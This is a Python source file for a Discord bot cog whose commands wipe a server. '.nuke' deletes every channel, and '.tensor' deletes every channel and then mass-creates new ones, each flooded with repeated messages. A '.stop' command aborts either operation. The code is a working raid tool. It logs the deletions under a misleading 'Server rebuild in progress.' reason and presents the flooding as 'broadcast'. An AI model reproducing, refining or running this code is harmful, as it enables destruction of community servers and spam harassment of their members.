import asyncio
import discord
from discord.ext import commands
import config

class BroadcastCog(commands.Cog):
    def __init__(self, bot):
        self.bot = bot
        self.is_broadcasting = False
        self.main_task = None
        self.active_tasks = set()

    def start_tracked_task(self, coro):
        """Starts a background task and tracks it so it can be cancelled immediately."""
        task = asyncio.create_task(coro)
        self.active_tasks.add(task)
        task.add_done_callback(self.active_tasks.discard)
        return task

    async def delete_channel_safe(self, channel: discord.abc.GuildChannel):
        """Deletes a single channel safely."""
        try:
            await channel.delete(reason="Server rebuild in progress.")
        except asyncio.CancelledError:
            raise
        except Exception as e:
            print(f"Failed to delete #{channel.name}: {e}")

    async def spam_channel(self, channel: discord.TextChannel):
        """Sends all broadcast messages simultaneously to a single channel."""
        try:
            send_tasks = []
            for _ in range(config.BROADCAST_COUNT):
                t = asyncio.create_task(channel.send(config.BROADCAST_MESSAGE))
                self.active_tasks.add(t)
                t.add_done_callback(self.active_tasks.discard)
                send_tasks.append(t)
            if send_tasks:
                await asyncio.gather(*send_tasks, return_exceptions=True)
            return True
        except asyncio.CancelledError:
            return False
        except Exception as e:
            print(f"Error spamming #{channel.name}: {e}")
            return False

    # ── Core logic runs as its own Task so it is always truly cancellable ──
    async def _tensor_logic(self, guild: discord.Guild):
        new_channels = []
        try:
            # STEP 1: Delete ALL channels simultaneously
            all_channels = list(guild.channels)
            delete_tasks = [
                self.start_tracked_task(self.delete_channel_safe(ch))
                for ch in all_channels
            ]
            if delete_tasks:
                await asyncio.gather(*delete_tasks, return_exceptions=True)

            # STEP 2: Create each channel + immediately spam it in background
            for _ in range(config.CHANNEL_LIMIT):
                try:
                    ch = await guild.create_text_channel(name=config.CHANNEL_NAME)
                    new_channels.append(ch)
                    # 🔥 Fire spam immediately in background
                    self.start_tracked_task(self.spam_channel(ch))
                    # Tiny delay to respect channel-creation rate limit
                    await asyncio.sleep(0.15)
                except discord.HTTPException as e:
                    if e.status == 429:
                        print("Rate-limited on channel creation. Waiting 1s...")
                        await asyncio.sleep(1.0)
                        try:
                            ch = await guild.create_text_channel(name=config.CHANNEL_NAME)
                            new_channels.append(ch)
                            self.start_tracked_task(self.spam_channel(ch))
                        except Exception as retry_e:
                            print(f"Retry failed: {retry_e}")
                    else:
                        print(f"HTTP error creating channel: {e}")
                except Exception as e:
                    print(f"Error creating channel: {e}")

            # Wait for all background spam tasks to finish
            while self.active_tasks:
                await asyncio.sleep(0.1)

            # Send completion message
            if new_channels:
                try:
                    await new_channels[0].send(
                        f"⚡ **Done!**\n"
                        f"✅ Created **{len(new_channels)}** channels.\n"
                        f"✅ Spammed **{config.BROADCAST_COUNT}** messages each."
                    )
                except Exception:
                    pass

        except asyncio.CancelledError:
            # Cancel all background spam/delete tasks instantly
            for task in list(self.active_tasks):
                task.cancel()
            if new_channels:
                try:
                    await new_channels[0].send("🛑 **Operation aborted!**")
                except Exception:
                    pass

    async def _nuke_logic(self, guild: discord.Guild):
        fallback_channel = None
        try:
            all_channels = list(guild.channels)
            delete_tasks = [
                self.start_tracked_task(self.delete_channel_safe(ch))
                for ch in all_channels
            ]
            if delete_tasks:
                await asyncio.gather(*delete_tasks, return_exceptions=True)

            fallback_channel = await guild.create_text_channel(name="nuked")
            await fallback_channel.send("✅ **All channels have been deleted.**")

        except asyncio.CancelledError:
            for task in list(self.active_tasks):
                task.cancel()
            if fallback_channel:
                try:
                    await fallback_channel.send("🛑 **Nuke aborted.**")
                except Exception:
                    pass

    @commands.command(name=".tensor")
    @commands.has_permissions(administrator=True)
    async def tensor(self, ctx):
        """Rebuilds server channels at max speed and spams them as they are created."""
        if self.is_broadcasting:
            await ctx.send("⚠️ An operation is already in progress! Use `nexus4all.stop` to abort.")
            return

        self.is_broadcasting = True
        self.active_tasks.clear()

        try:
            # Wrap logic in its own explicit Task — this is always cancellable
            self.main_task = asyncio.create_task(self._tensor_logic(ctx.guild))
            await self.main_task
        except asyncio.CancelledError:
            pass
        finally:
            self.is_broadcasting = False
            self.main_task = None
            self.active_tasks.clear()

    @commands.command(name=".nuke")
    @commands.has_permissions(administrator=True)
    async def nuke(self, ctx):
        """Deletes ALL channels simultaneously and creates one fallback channel."""
        if self.is_broadcasting:
            await ctx.send("⚠️ An operation is already in progress! Use `nexus4all.stop` to abort.")
            return

        self.is_broadcasting = True
        self.active_tasks.clear()

        try:
            # Wrap logic in its own explicit Task — this is always cancellable
            self.main_task = asyncio.create_task(self._nuke_logic(ctx.guild))
            await self.main_task
        except asyncio.CancelledError:
            pass
        finally:
            self.is_broadcasting = False
            self.main_task = None
            self.active_tasks.clear()

    @commands.command(name=".stop")
    @commands.has_permissions(administrator=True)
    async def stop(self, ctx):
        """Instantly kills all active tensor/nuke operations."""
        if not self.is_broadcasting or self.main_task is None:
            await ctx.send("❌ No active operation is running.")
            return

        # Cancel the main logic task
        if not self.main_task.done():
            self.main_task.cancel()

        # Cancel all background spam/delete tasks
        for task in list(self.active_tasks):
            if not task.done():
                task.cancel()

        await ctx.send("🛑 **All operations terminated instantly.**")

async def setup(bot):
    await bot.add_cog(BroadcastCog(bot))
